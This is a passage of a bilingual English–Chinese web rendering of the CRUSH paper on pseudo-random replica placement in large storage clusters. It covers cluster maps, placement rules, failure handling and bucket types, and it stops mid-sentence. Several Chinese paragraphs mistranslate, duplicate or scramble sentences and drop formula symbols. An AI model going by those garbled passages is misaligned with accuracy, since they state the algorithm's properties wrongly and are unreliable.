在内部管理磁盘块分配，并公开一个接口，允许其他设备读写大小可变的命名对象。在这样的系统中，每个文件的数据通常被条带化到分布在整个存储集群中的相对较少的命名对象上。对象会在多个设备上复制（或采用其他数据冗余方案），以防止在发生故障时丢失数据。基于对象的存储系统通过将大型块列表替换为小型对象列表并分散低级块分配问题来简化数据布局。虽然这通过减少文件分配元数据和复杂性极大地提高了可扩展性，但其根本在数千个存储设备（通常具有不同的容量和性能特征）之间分配数据的脑力任务仍然存在。</p><p>Most systems simply write new data to underutilized devices. The fundamental problem with this approach is that data is rarely, if ever, moved once it is written. Even a perfect distribution will become imbalanced when the storage system is expanded, because new disks either sit empty or contain only new data. Either old or new disks may be busy, depending on the system workload, but only the rarest of conditions will utilize both equally to take full advantage of available resources.</p><p>大多数系统只是将新数据写入未充分利用的设备。这种方法的根本问题在于，数据一旦写入，就很少（甚至根本不会）移动。即使是完美的分布，在存储系统扩展时也会变得不平衡，因为新磁盘要么空着，要么只包含新数据。根据系统工作负载，新旧磁盘都可能处于繁忙状态，但只有在极少数情况下，两者才能均衡利用，从而充分利用可用资源。</p><p>A robust solution is to distribute all data in a system randomly among available storage devices. This leads to a probabilistically balanced distribution and uniformly mixes old and new data together. When new storage is added, a random sample of existing data is migrated onto new storage devices to restore balance. This approach has the critical advantage that, on average, all devices will be similarly loaded, allowing the system to perform well under any potential workload [Santos et al. 2000]. Furthermore, in a large storage system, a single large file will be randomly distributed across a large set of available devices, providing a high level of parallelism and aggregate bandwidth. However, simple hashbased distribution fails to cope with changes in the number of devices, incurring a massive reshuffling of data. Further, existing randomized distribution schemes that decluster replication by spreading each disk’s replicas across many other devices suffer from a high probability of data loss from coincident device failures.</p><p>一种稳健的解决方案是将系统中的所有数据随机分布在可用的存储设备中。这将实现概率平衡的分布，并均匀地混合新旧数据。添加新存储时，现有数据的随机样本将迁移到新的存储设备上以恢复平衡。这种方法的关键优势在于，平均而言，所有设备的负载都相似，从而使系统在任何潜在工作负载下都能表现良好 [Santos et al. 2000]。此外，在大型存储系统中，单个大文件将随机分布在大量可用设备上，从而提供高水平的并行性和总带宽。然而，简单的基于哈希的分布无法应对设备数量的变化，会导致数据大规模重新排列。此外，现有的随机分布方案通过将每个磁盘的副本分散到许多其他设备上来分散复制，由于设备同时发生故障，数据丢失的概率很高。</p><p>We have developed CRUSH (Controlled Replication Under Scalable Hashing), a pseudo-random data distribution algorithm that efficiently and robustly distributes object replicas across a heterogeneous, structured storage cluster. CRUSH is implemented as a pseudo-random, deterministic function that maps an input value, typically an object or object group identifier, to a list of devices on which to store object replicas. This differs from conventional approaches in that data placement does not rely on any sort of per-file or per-object directory—CRUSH needs only a compact, hierarchical description of the devices comprising the storage cluster and knowledge of the replica placement policy. This approach has two key advantages: first, it is completely distributed such that any party in a large system can independently calculate the location of any object; and second, what little metadata is required is mostly static, changing only when devices are added or removed.</p><p>我们开发了 CRUSH（可扩展哈希下的受控复制），这是一种伪随机数据分布算法，能够在异构结构化存储集群中高效且稳健地分布对象副本。CRUSH 实现为一个伪随机的确定性函数，它将输入值（通常是对象或对象组标识符）映射到用于存储对象副本的设备列表。这与传统方法的不同之处在于，数据放置不依赖于任何类型的文件或对象目录——CRUSH 只需要对组成存储集群的设备进行紧凑的分层描述，以及副本放置策略的知识。这种方法有两个关键优势：首先，它是完全分布式的，大型系统中的任何一方都可以独立计算任何对象的位置；其次，这与传统方法的不同之处在于，数据放置不依赖于任何类型的每个文件或每个对象目录 - CRUSH 只需要少量紧凑的元数据，这些元数据大多是静态的，仅在添加或删除设备时更改。</p><p>CRUSH is designed to optimally distribute data to utilize available resources, efficiently reorganize data when storage devices are added or removed, and enforce flexible constraints on object replica placement that maximize data safety in the presence of coincident or correlated hardware failures. A wide variety of data safety mechanisms are supported, including n-way replication (mirroring), RAID parity schemes or other forms of erasure coding, and hybrid approaches (e. g., RAID-10). These features make CRUSH ideally suited for managing object distribution in extremely large (multi-petabyte) storage systems where scalability, performance, and reliability are critically important.</p><p>CRUSH 的设计目标是以最优方式分配数据以充分利用可用资源，在添加或移除存储设备时高效地重组数据，并对对象副本的放置施加灵活的约束，从而在发生同时或相关的硬件故障时最大限度地保障数据安全。它支持多种数据安全机制，包括多路复制（镜像）、RAID 奇偶校验方案或其他形式的纠删码，以及混合方案（例如 RAID-10）。这些特性使 CRUSH 非常适合在可扩展性、性能和可靠性至关重要的超大规模（多 PB）存储系统中管理对象分布。</p><h1 id="2、相关工作"><a href="#2、相关工作" class="headerlink" title="2、相关工作"></a>2、相关工作</h1><p>Object-based storage has recently garnered significant interest as a mechanism for improving the scalability of storage systems. A number of research and production file systems have adopted an object-based approach, including the seminal NASD file system [Gobioff et al. 1997], the Panasas file system [Nagle et al. 2004], Lustre [Braam 2004], and others [Rodeh and Teperman 2003; Ghemawat et al. 2003]. Other block-based distributed file systems like GPFS [Schmuck and Haskin 2002] and Federated Array of Bricks (FAB) [Saito et al. 2004] face a similar data distribution challenge. In these systems a semi-random or heuristicbased approach is used to allocate new data to storage devices with available capacity, but data is rarely relocated to maintain a balanced distribution over time. More importantly, all of these systems locate data via some sort of metadata directory, while CRUSH relies instead on a compact cluster description and deterministic mapping function. This distinction is most significant when writing data, as systems utilizing CRUSH can calculate any new data’s storage target without consulting a central allocator. The Sorrento [Tang et al. 2004] storage system’s use of consistent hashing [Karger et al. 1997] most closely resembles CRUSH, but lacks support for controlled weighting of devices, a wellbalanced distribution of data, and failure domains for improving data safety.</p><p>作为一种提升存储系统可扩展性的机制，基于对象的存储近年来引起了广泛关注。许多研究和生产文件系统都采用了基于对象的方法，包括开创性的 NASD 文件系统 [Gobioff et al. 1997]、Panasas 文件系统 [Nagle et al. 2004]、Lustre [Braam 2004] 以及其他文件系统 [Rodeh and Teperman 2003; Ghemawat et al. 2003]。其他基于块的分布式文件系统，例如 GPFS [Schmuck and Haskin 2002] 和 Federated Array of Bricks (FAB) [Saito et al. 2004]，也面临着类似的数据分布挑战。在这些系统中，人们采用半随机或启发式方法将新数据分配到具有可用容量的存储设备中，但很少重新定位数据以保持长期均衡分布。更重要的是，所有这些系统都通过某种元数据目录来定位数据，而 CRUSH 则依赖于紧凑的集群描述和确定性映射函数。这种区别在写入数据时最为明显，因为使用 CRUSH 的系统无需咨询中央分配器即可计算任何新数据的存储目标。Sorrento [Tang et al. 2004] 存储系统对一致性哈希 [Karger et al. 1997] 的使用与 CRUSH 最为相似，但缺乏对设备权重控制、数据均衡分布以及故障域（用于提高数据安全性）的支持。</p><p>Although the data migration problem has been studied extensively in the context of systems with explicit allocation maps [Anderson et al. 2001; Anderson et al. 2002], such approaches have heavy metadata requirements that functional approaches like CRUSH avoid. Choy, et al. [1996] describe algorithms for distributing data over disks which move an optimal number of objects as disks are added, but do not support weighting, replication, or disk removal. Brinkmann, et al. [2000] use hash functions to distribute data to a heterogeneous but static cluster. SCADDAR [Goel et al. 2002] addresses the addition and removal of storage, but only supports a constrained subset of replication strategies. None of these approaches include CRUSH’s flexibility or failure do mains for improved reliability.</p><p>尽管数据迁移问题已在具有显式分配图的系统环境中得到广泛研究 [Anderson 等人 2001；Anderson 等人 2002]，但此类方法对元数据的要求很高，而 CRUSH 等函数式方法则可避免这种情况。Choy 等人 [1996] 描述了在磁盘上分配数据的算法，这些算法会在添加磁盘时移动最优数量的对象，但不支持加权、复制或磁盘移除。Brinkmann 等人 [2000] 使用哈希函数将数据分发到异构但静态的集群。SCADDAR [Goel 等人 2002] 解决了存储的添加和移除问题，但仅支持有限的复制策略子集。这些方法都不具备 CRUSH 的灵活性或故障域，因此无法提高可靠性。</p><p>CRUSH most closely resembles the RUSH [Honicky and Miller 2004] family of algorithms upon which it is based. RUSH remains the only existing set of algorithms in the literature that utilizes a mapping function in place of explicit metadata and supports the efficient addition and removal of weighted devices. Despite these basic properties, a number of issues make RUSH an insufficient solution in practice. CRUSH fully generalizes the useful elements of RUSHp and RUSHt while resolving previously unaddressed reliability and replication issues, and offering improved performance and flexibility.</p><p>CRUSH 与其所基于的 RUSH [Honicky and Miller 2004] 算法系列最为相似。RUSH 仍然是文献中唯一一组使用映射函数代替显式元数据并支持高效添加和移除加权设备的算法。尽管具备这些基本特性，但一些问题使得 RUSH 在实践中无法提供足够的解决方案。CRUSH 充分概括了 RUSHp 和 RUSHt 的实用元素，同时解决了先前未解决的可靠性和复制问题，并提供了更高的性能和灵活性。</p><h1 id="3、CRUSH-算法"><a href="#3、CRUSH-算法" class="headerlink" title="3、CRUSH 算法"></a>3、CRUSH 算法</h1><p>The CRUSH algorithm distributes data objects among storage devices according to a per-device weight value, approximating a uniform probability distribution. The distribution is controlled by a hierarchical cluster map representing the available storage resources and composed of the logical elements from which it is built. For example, one might describe a large installation in terms of rows of server cabinets, cabinets filled with disk shelves, and shelves filled with storage devices. The data distribution policy is defined in terms of placement rules that specify how many replica targets are chosen from the cluster and what restrictions are imposed on replica placement. For example, one might specify that three mirrored replicas are to be placed on devices in different physical cabinets so that they do not share the same electrical circuit.</p><p>CRUSH 算法根据每个设备的权重值将数据对象分布在存储设备之间，近似于均匀的概率分布。该分布由表示可用存储资源的层级集群图控制，该图由构建集群的逻辑元素组成。例如，可以用成排的服务器机柜、装满磁盘架的机柜以及装满存储设备的机架来描述大型设施。数据分布策略根据放置规则定义，这些规则指定从集群中选择多少个副本目标以及对副本放置施加哪些限制。例如，可以指定将三个镜像副本放置在不同物理机柜中的设备上，以使它们不共享同一电路。</p><p>Given a single integer input value x, CRUSH will output an ordered list R of n distinct storage targets. CRUSH utilizes a strong multi-input integer hash function whose inputs include x, making the mapping completely deterministic and independently calculable using only the cluster map, placement rules, and x. The distribution is pseudo-random in that there is no apparent correlation between the resulting output from similar inputs or in the items stored on any storage device. We say that CRUSH generates a declustered distribution of replicas in that the set of devices sharing replicas for one item also appears to be independent of all other items.</p><p>给定一个整数输入值 x，CRUSH 将输出一个包含 n 个不同存储目标的有序列表 R。CRUSH 使用一个强多输入整数哈希函数，其输入包含 x，从而使映射具有完全确定性，并且仅使用集群映射、放置规则和 x 即可独立计算。该分布是伪随机的，因为相似输入的结果输出之间以及存储在任何存储设备上的项目之间没有明显的相关性。我们称 CRUSH 生成非集群副本分布，因为共享某个项目的副本的设备集似乎也与所有其他项目无关。</p><h2 id="3-1、层次聚类图"><a href="#3-1、层次聚类图" class="headerlink" title="3.1、层次聚类图"></a>3.1、层次聚类图</h2><p>The cluster map is composed of devices and buckets, both of which have numerical identifiers and weight values associated with them. Buckets can contain any number of devices or other buckets, allowing them to form interior nodes in a storage hierarchy in which devices are always at the leaves. Storage devices are assigned weights by the administrator to control the relative amount of data they are responsible for storing. Although a large system will likely contain devices with a variety of capacity and performance characteristics, randomized data distributions statistically correlate device utilization with workload, such that device load is on average proportional to the amount of data stored. This results in a one-dimensional placement metric, weight, which should be derived from the device’s capabilities. Bucket weights are defined as the sum of the weights of the items they contain.</p><p>集群图由设备和存储桶组成，两者都具有与之关联的数字标识符和权重值。存储桶可以包含任意数量的设备或其他存储桶，从而允许它们构成存储层次结构中的内部节点，其中设备始终位于叶子节点。管理员会为存储设备分配权重，以控制其负责存储的相对数据量。虽然大型系统可能包含具有各种容量和性能特征的设备，但随机数据分布在统计上与设备存储桶可以包含任意数量的设备或其他具有工作负载的存储桶利用率，使得设备负载平均与存储的数据量成正比。这会产生一个一维的放置指标——权重，该指标应根据设备的功能得出。存储桶权重定义为其所含项目权重的总和。</p><p>Buckets can be composed arbitrarily to construct a hierarchy representing available storage. For example, one might create a cluster map with “shelf” buckets at the lowest level to represent sets of identical devices as they are installed, and then combine shelves into “cabinet” buckets to group together shelves that are installed in the same rack. Cabinets might be further grouped into “row” or “room” buckets for a large system. Data is placed in the hierarchy by recursively selecting nested bucket items via a pseudo-random hash-like function. In contrast to conventional hashing techniques, in which any change in the number of target bins (devices) results in a massive reshuffling of bin contents, CRUSH is based on four different bucket types, each with a different selection algorithm to address data movement resulting from the addition or removal of devices and overall computational complexity.</p><p>存储桶可以任意组合，以构建表示可用存储的层级结构。例如，可以创建一个集群图，最低层级为“机架”存储桶，用于表示已安装的相同设备集合；然后将机架组合成“机柜”存储桶，将安装在同一机架中的机架归为一组。对于大型系统，机柜可以进一步分组为“行”或“房间”存储桶。数据通过伪随机哈希函数递归选择嵌套存储桶项，从而放置在层级结构中。传统哈希技术中，目标存储箱（设备）数量的任何变化都会导致存储箱内容的大规模重新排列。相比之下，CRUSH 基于四种不同的存储桶类型，每种类型都采用不同的选择算法来处理因添加或移除设备而导致的数据移动以及整体计算复杂度。</p><h2 id="3-2、副本放置"><a href="#3-2、副本放置" class="headerlink" title="3.2、副本放置"></a>3.2、副本放置</h2><p>CRUSH is designed to distribute data uniformly among weighted devices to maintain a statistically balanced utilization of storage and device bandwidth resources. The placement of replicas on storage devices in the hierarchy can also have a critical effect on data safety. By reflecting the underlying physical organization of the installation, CRUSH can model—and thereby address—potential sources of correlated device failures. Typical sources include physical proximity, a shared power source, and a shared network. By encoding this information into the cluster map, CRUSH placement policies can separate object replicas across different failure domains while still maintaining the desired distribution. For example, to address the possibility of concurrent failures, it may be desirable to ensure that data replicas are on devices in different shelves, racks, power supplies, controllers, and&#x2F;or physical locations.</p><p>CRUSH 旨在将数据均匀地分布在加权设备之间，以保持存储和设备带宽资源的统计平衡利用率。副本在层级结构中存储设备上的放置位置也会对数据安全产生关键影响。通过反映设备底层的物理组织结构，CRUSH 可以建模并由此解决相关设备故障的潜在根源。典型的根源包括物理邻近性、共享电源和共享网络。通过将这些信息编码到集群映射中，CRUSH 放置策略可以将对象副本分散到不同的故障域中，同时仍保持所需的分布。例如，为了应对并发故障的可能性，可能需要确保数据副本位于不同机架、机柜、电源、控制器和&#x2F;或物理位置的设备上。</p><p>In order to accommodate the wide variety of scenarios in which CRUSH might be used, both in terms of data replication strategies and underlying hardware configurations, CRUSH defines placement rules for each replication strategy or distribution policy employed that allow the storage system or administrator to specify exactly how object replicas are placed. For example, one might have a rule selecting a pair of targets for 2-way mirroring, one for selecting three targets in two different data centers for 3-way mirroring, one for RAID-4 over six storage devices, and so on1.</p><p>为了适应 CRUSH 的各种应用场景，包括数据复制策略和底层硬件配置，CRUSH 为每种复制策略或分发策略定义了放置规则，允许存储系统或管理员精确指定对象副本的放置方式。例如，一个规则可以选择一对目标进行双向镜像，一个规则可以选择位于两个不同数据中心的三个目标进行三向镜像，一个规则可以选择用于六个存储设备上的 RAID-4 镜像，等等。</p><div><p><img src="/assets/images/crush-algorithm-1.png" alt="Algorithm 1 CRUSH placement for object x" loading="lazy"></p></div><p>Each rule consists of a sequence of operations applied to the hierarchy in a simple execution environment, presented as pseudocode in Algorithm 1. The integer input to the CRUSH function, x, is typically an object name or other identifier, such as an identifier for a group of objects whose replicas will be placed on the same devices. The take(a) operation selects an item (typically a bucket) within the storage hierarchy and assigns it to the vector i, which serves as an input to subsequent operations. The select(n,t) operation iterates over each element i ∈ i, and chooses n distinct items of type t in the subtree rooted at that point. Storage devices have a known, fixed type, and each bucket in the system has a type field that is used to distinguish between classes of buckets (e. g., those representing “rows” and those representing “cabinets”). For each i ∈ i, the select(n,t) call iterates over the r ∈ 1,…,n items requested and recursively descends through any intermediate buckets, pseudo-randomly selecting a nested item in each bucket using the function c(r,x) (defined for each kind of bucket in Section 3.4), until it finds an item of the requested type t. The resulting n| i| distinct items are placed back into the input i and either form the input for a subsequent select(n,t) or are moved into the result vector with an emit operation.</p><p>每条规则由应用于简单执行环境中的层次结构的一系列操作组成，呈现如算法 1 中的伪代码所示。CRUSH 函数的整数输入 x 通常是对象名称或其他标识符，例如，一组对象的标识符，这些对象的副本将放置在相同的设备上。take(a) 操作在存储层次结构中选择一个项目（通常是一个存储桶），并将其分配给向量 i，该向量作为后续操作的输入。select(n,t) 操作迭代每个元素 i ∈ i，并在以该点为根的子树中选择 n 个不同的类型为 t 的项目。存储设备具有已知的固定类型，系统中的每个存储桶都有一个 type 字段用于区分存储桶的类别（例如，表示“行”的存储桶和表示“柜子”的存储桶）。对于每个 i ∈ i，select(n,t) 调用会遍历请求的 r ∈ 1, …, n 个项目，并以递归方式向下遍历任何中间存储桶，使用函数 c(r, x)（在第 3.4 节中为每种类型的存储桶定义）伪随机地在每个存储桶中选择一个嵌套项目，直到找到所需类型为 t 的项目。将得到的 n| i| 个不同项目放回输入 i 中，并形成后续 select(n,t) 的输入，或者通过 emit 操作将其移入结果向量。</p><p>As an example, the rule defined in Table 1 begins at the root of the hierarchy in Figure 1 and with the first select(1,row) chooses a single bucket of type “row” (it selects row2). The subsequent select(3,cabinet) chooses three distinct cabinets nested beneath the previously selected row2 (cab21,cab23,cab24), while the final select(1,disk) iterates over the three cabinet buckets in the input vector and chooses a single disk nested beneath each of them. The final result is three disks spread over three cabinets, but all in the same row. This approach thus allows replicas to be simultaneously separated across and constrained within container types (e. g. rows, cabinets, shelves), a useful property for both reliability and performance considerations. Rules consisting of multiple take, emit blocks allow storage targets to be explicitly drawn from different pools of storage, as might be expected in remote replication scenarios (in which one replica is stored at a remote site) or tiered installations (e. g., fast, near-line storage and slower, higher-capacity arrays).</p><p>举例来说，表 1 中定义的规则从图 1 中层次结构的根开始，第一个 select(1,row) 选择类型为“row”的单个存储桶（它选择了 row2）。随后的 select(3,cabinet) 选择嵌套在先前选择的 row2 下方的三个不同的机柜（cab21、cab23、cab24），而最后一个 select(1,disk) 则在输入向量中的三个机柜存储桶上进行迭代，并选择嵌套在每个存储桶下方的单个磁盘。最终结果是三个磁盘分布在三个机柜上，但都在同一行中。因此，这种方法允许副本同时在容器类型（例如行、机柜、架子）内分离和约束，这对于可靠性和性能考虑都很有用。由多个 take、emit 块组成的规则允许从不同的存储池中明确提取存储目标，就像在远程复制场景（其中一个副本存储在远程站点）或分层安装（例如，快速、近线存储和较慢、更高容量的阵列）中所预期的那样。</p><div><p><img src="/assets/images/crush-table-1.png" alt="Table 1: A simple rule that distributes three replicas across three cabinets in the same row." loading="lazy"></p></div><div><p><img src="/assets/images/crush-figure-1.png" alt="Figure 1: A partial view of a four-level cluster map hierarchy consisting of rows, cabinets, and shelves of disks. Bold lines illustrate items selected by each select operation in the placement rule and fictitious mapping described by Table 1." loading="lazy"></p></div><h3 id="3-2-1、碰撞、故障和过载"><a href="#3-2-1、碰撞、故障和过载" class="headerlink" title="3.2.1、碰撞、故障和过载"></a>3.2.1、碰撞、故障和过载</h3><p>The select(n,t) operation may traverse many levels of the storage hierarchy in order to locate n distinct items of the specified type t nested beneath its starting point, a recursive process partially parameterized by r &#x3D; 1,…,n, the replica number being chosen. During this process, CRUSH may reject and reselect items using a modified input r ′ for three different reasons: if an item has already been selected in the current set (a collision—the select(n,t) result must be distinct), if a device is failed, or if a device is overloaded. Failed or overloaded devices are marked as such in the cluster map, but left in the hierarchy to avoid unnecessary shifting of data. CRUSH’s selectively diverts a fraction of an overloaded device’s data by pseudo-randomly rejecting with the probability specified in the cluster map—typically related to its reported over-utilization. For failed or overloaded devices, CRUSH uniformly redistributes items across the storage cluster by restarting the recursion at the beginning of the select(n,t) (see Algorithm 1 line 11). In the case of collisions, an alternate r′ is used first at inner levels of the recursion to attempt a local search (see Algorithm 1 line 14) and avoid skewing the overall data distribution away from subtrees where collisions are more probable (e. g., where buckets are smaller than n).</p><p>select(n,t) 操作可能会遍历存储层级的多个层级，以便在其起始点下方找到嵌套的 n 个指定类型 t 的不同项目。这是一个递归过程，部分参数为 r &#x3D; 1, …, n，其中副本数量已选定。在此过程中，CRUSH 可能会出于以下三种不同原因，使用修改后的输入 r 拒绝并重新选择项目：如果某个项目已在当前集合中被选中（发生冲突——select(n,t) 的结果必须不同）、设备发生故障或设备过载。故障或过载的设备会在集群映射中被标记，但仍会保留在层级结构中，以避免不必要的数据移动。 CRUSH 会通过伪随机拒绝的方式，选择性地转移过载设备的部分数据，其概率通常与集群图中指定的过载率相关。对于故障或过载的设备，CRUSH 会通过在 select(n,t) 的开头重新启动递归，在存储集群中均匀地重新分配项目（参见算法 1 第 11 行）。如果发生冲突，则首先在递归的内层使用备用方案，尝试进行局部搜索（参见算法 1 第 14 行），以避免整体数据分布偏离更可能发生冲突的子树（例如，桶小于 n 的情况）。</p><h3 id="3-2-2、副本等级"><a href="#3-2-2、副本等级" class="headerlink" title="3.2.2、副本等级"></a>3.2.2、副本等级</h3><p>Parity and erasure coding schemes have slightly different placement requirements than replication. In primary copy replication schemes, it is often desirable after a failure for a previous replica target (that already has a copy of the data) to become the new primary. In such situations, CRUSH can use the “first n” suitable targets by reselecting using r ′ &#x3D; r + f , where f is the number of failed placement attempts by the current select(n,t) (see Algorithm 1 line 16). With parity and erasure coding schemes, however, the rank or position of a storage device in the CRUSH output is critical because each target stores different bits of the data object. In particular, if a storage device fails, it should be replaced in CRUSH’s output list R in place, such that other devices in the list retain the same rank (i. e. position in R, see Figure 2). In such cases, CRUSH reselects using r ′ &#x3D; r + frn, where fr is the number of failed attempts on r, thus defining a sequence of candidates for each replica rank that are probabilistically independent of others’ failures. In contrast, RUSH has no special handling of failed devices; like other existing hashing distribution functions, it implicitly assumes the use of a “first n” approach to skip over failed devices in the result, making it unweildly for parity schemes.</p><p>奇偶校验和纠删码方案的放置要求与复制略有不同。在主副本复制方案中，通常希望在发生故障后，让先前的副本目标（已拥有数据副本）成为新的主副本。在这种情况下，CRUSH 可以通过使用 r&#x3D; r + f 重新选择来使用“前 n 个”合适的目标，其中 f 是当前 select(n,t) 尝试放置失败的次数（参见算法 1 第 16 行）。然而，对于奇偶校验和纠删码方案，存储设备在 CRUSH 输出中的排名或位置至关重要，因为每个目标存储数据对象的不同位。具体而言，如果某个存储设备发生故障，应将其在 CRUSH 的输出列表 R 中原地替换，以使列表中的其他设备保持相同的排名（即在 R 中的位置，参见图 2）。在这种情况下，CRUSH 使用 r&#x3D;r + fn 进行重新选择，其中 f 表示对 r 的失败尝试次数，从而为每个副本等级定义一个候选序列，这些候选序列在概率上不受其他副本故障的影响。相比之下，RUSH 对故障设备没有特殊处理；与其他现有的哈希分布函数一样，它隐式地假设使用“前 n 个”方法来跳过结果中的故障设备，这使得它对于奇偶校验方案来说很不方便。</p><div><p><img src="/assets/images/crush-figure-2.png" alt="Figure 2: Reselection behavior of select(6,disk) when device r &#x3D; 2 (b) is rejected, where the boxes contain the CRUSH output R of n &#x3D; 6 devices numbered by rank. The left shows the “first n” approach in which device ranks of existing devices (c,d,e, f) may shift. On the right, each rank has a probabilistically independent sequence of potential targets; here fr &#x3D; 1, and r′ &#x3D; r+ frn &#x3D; 8 (device h)." loading="lazy"></p></div><h2 id="3-3、地图变化和数据移动"><a href="#3-3、地图变化和数据移动" class="headerlink" title="3.3、地图变化和数据移动"></a>3.3、地图变化和数据移动</h2><p>A critical element of data distribution in a large file system is the response to the addition or removal of storage resources. CRUSH maintains a uniform distribution of data and workload at all times in order to avoid load asymmetries and the related underutilization of available resources. When an individual device fails, CRUSH flags the device but leaves it in the hierarchy, where it will be rejected and its contents uniformly redistributed by the placement algorithm (see Section 3.2.1). Such cluster map changes result in an optimal (minimum) fraction, wf ailed &#x2F;W (where W is the total weight of all devices), of total data to be remapped to new storage targets because only data on the failed device is moved.</p><p>大型文件系统中数据分布的一个关键要素是对存储资源添加或移除的响应。CRUSH 始终保持数据和工作负载的均匀分布，以避免负载不对称以及由此导致的可用资源利用不足。当单个设备发生故障时，CRUSH 会标记该设备，但会将其保留在层级结构中，该设备将被拒绝，其内容将由布局算法（参见第 3.2.1 节）均匀地重新分布。此类集群映射更改会导致总数据重新映射到新存储目标的最佳（最小）比例 w &#x2F;W（其中 W 是所有设备的总权重），因为只有故障设备上的数据会被移动。</p><p>The situation is more complex when the cluster hierarchy is modified, as with the addition or removal of storage resources. The CRUSH mapping process, which uses the cluster map as a weighted hierarchical decision tree, can result in additional data movement beyond the theoretical optimum of ∆w W. At each level of the hierarchy, when a shift in relative subtree weights alters the distribution, some data objects must move from from subtrees with decreased weight to those with increased weight. Because the pseudo-random placement decision at each node in the hierarchy is statistically independent, data moving into a subtree is uniformly redistributed beneath that point, and does not necessarily get remapped to the leaf item ultimately responsible for the weight change. Only at subsequent (deeper) levels of the placement process does (often different) data get shifted to maintain the correct overall relative distributions. This general effect is illustrated in the case of a binary hierarchy in Figure 3.</p><p>当集群层次结构发生修改时，情况会变得更加复杂，例如添加或删除存储资源。CRUSH 映射过程将集群映射图用作加权层次决策树，这可能会导致超出理论最优值的额外数据移动。的。在层次结构的每个级别上，当相对子树权重的变化改变了分布时，一些数据对象必须从权重降低的子树移动到权重增加的子树。由于层次结构中每个节点的伪随机放置决策在统计上是独立的，因此移动到子树的数据会在该点下方均匀地重新分布，并且不一定会重新映射到最终导致权重变化的叶项。只有在放置过程的后续（更深）级别，数据（通常不同）才会发生移动，以维持正确的整体相对分布。图 3 中的二进制层次结构说明了这种普遍效应。</p><div><p><img src="/assets/images/crush-figure-3.png" alt="Figure 3: Data movement in a binary hierarchy due to a node addition and the subsequent weight changes." loading="lazy"></p></div><p>The amount of data movement in a hierarchy has a lower bound of ∆w W, the fraction of data that would reside on a newly added device with weight ∆w. Data movement increases with the height h of the hierarchy, with a conservative asymptotic upper bound of h ∆w W. The amount of movement approaches this upper bound when ∆w is small relative to W, because data objects moving into a subtree at each step of the recursion have a very low probability of being mapped to an item with a small relative weight.</p><p>层次结构中的数据移动量有一个下限，即驻留在新添加的权重为 ∆w 的设备上的数据比例。数据移动量随层次结构高度 h 的增加而增加，保守估计 h 的渐近上界。当 ∆w 相对于 W 较小时，移动量接近此上限，因为在递归的每一步中移动到子树的数据对象映射到相对权重较小的项目的概率非常低。</p><h2 id="3-4、桶类型"><a href="#3-4、桶类型" class="headerlink" title="3.4、桶类型"></a>3.4、桶类型</h2><p>Generally speaking, CRUSH is designed to reconcile two competing goals: efficiency and scalability of the mapping algorithm, and minimal data migration to restore a balanced distribution when the cluster changes due to the addition or removal of devices. To this end, CRUSH defines four different kinds of buckets to represent internal (non-leaf) nodes in the cluster hierarchy: uniform buckets, list buckets, tree buckets, and straw buckets. Each bucket type is based on a different internal data structure and utilizes a different function c(r,x) for pseudo-randomly choosing nested items during the replica placement process, representing a different tradeoff between computation and reorganization efficiency. Uniform buckets are restricted in that they must contain items that are all of the same weight (much like a conventional hash-based distribution function), while the other bucket types can contain a mix of items with any combination of weights. These differences are summarized in Table 2.</p><p>总体而言，CRUSH 的设计旨在协调两个相互竞争的目标：映射算法的效率和可扩展性，以及在集群因设备添加或移除而发生变化时，通过最小化数据迁移来恢复均衡分布。为此，CRUSH 定义了四种不同类型的 bucket 来表示集群层级结构中的内部（非叶子）节点：统一 bucket、列表 bucket、树 bucket 和秸秆 bucket。每种 bucket 类型基于不同的内部数据结构，并使用不同的函数 c(r, x) 在副本放置过程中伪随机地选择嵌套项，这代表了计算效率和重组效率之间的不同权衡。统一 bucket 的限制在于它们必须包含所有权重相同的项（非常类似于传统的基于哈希的分布函数），而其他 bucket 类型可以包含具有任意权重组合的混合项。这些差异总结如下：表 2.</p><div><p><img src="/assets/images/crush-table-2.png" alt="Table 2: Summary of mapping speed and data reorganization efficiency of different bucket types when items are added to or removed from a bucket." loading="lazy"></p></div><h3 id="3-4-1、Uniform-Buckets"><a href="#3-4-1、Uniform-Buckets" class="headerlink" title="3.4.1、Uniform Buckets"></a>3.4.1、Uniform Buckets</h3><p>Devices are rarely added individually in a large system. Instead, new storage is typically deployed in blocks of identical devices, often as an additional shelf in a server rack or perhaps an entire cabinet. Devices reaching their end of life are often similarly decommissioned as a set (individual failures aside), making it natural to treat them as a unit. CRUSH uniform buckets are used to represent an identical set of devices in such circumstances. The key advantage in doing so is performance related: CRUSH can map replicas into uniform buckets in constant time. In cases where the uniformity restrictions are not appropriate, other bucket types can be used.</p><p>在大型系统中，很少单独添加设备。相反，新的存储通常以相同设备块的形式部署，通常是服务器机架中的附加机架，或者整个机柜。达到使用寿命的设备通常会以类似的方式作为一组设备退役（个别故障除外），因此将它们视为一个单元是很自然的。在这种情况下，CRUSH 统一桶用于表示一组相同的设备。这样做的主要优势在于性能：CRUSH 可以在常数时间内将副本映射到统一桶中。如果一致性限制不适用，可以使用其他类型的桶。</p><p>Given a CRUSH input value of x and a replica number r, we choose an item from a uniform bucket of size m using the function c(r,x) &#x3D; (hash(x)+ rp) mod m, where p is a randomly (but deterministically) chosen prime number greater than m. For any r ≤ m we can show that we will always select a distinct item using a few simple number theory lemmas.2 For r &gt; m this guarantee no longer holds, meaning two different replicas r with the same input x may resolve to the same item. In practice, this means nothing more than a non-zero probability of collisions and subsequent backtracking by the placement algorithm (see Section 3.2.1).</p><p>给定 CRUSH 输入值 x 和副本数量 r，我们使用函数 c(r, x) &#x3D; (hash(x) + rp) mod m，从大小为 m 的均匀存储桶中选择一个项目，其中 p 是随机（但确定性地）选择的大于 m 的素数。对于任何 r ≤ m，我们可以通过一些简单的数论引理证明，我们总是会选择一个不同的项目。当 r &gt; m 时，此保证不再成立，这意味着具有相同输入 x 的两个不同副本 r 可能解析为同一个项目。实际上，这只不过意味着碰撞概率不为零，以及随后的放置算法会进行回溯（参见第 3.2.1 节）。</p><p>If the size of a uniform bucket changes, there is a complete reshuffling of data between devices, much like conventional hash-based distribution strategies.</p><p>如果统一存储桶的大小发生变化，则设备之间的数据将完全重新排列，就像传统的基于哈希的分发策略一样。</p><h3 id="3-4-2、List-Buckets"><a href="#3-4-2、List-Buckets" class="headerlink" title="3.4.2、List Buckets"></a>3.4.2、List Buckets</h3><p>List buckets structure their contents as a linked list, and can contain items with arbitrary weights. To place a replica, CRUSH begins at the head of the list with the most recently added item and compares its weight to the sum of all remaining items’ weights. Depending on the value of hash(x,r,item), either the current item is chosen with the appropriate probability, or the process continues recursively down the list. This approach, derived from RUSHp, recasts the 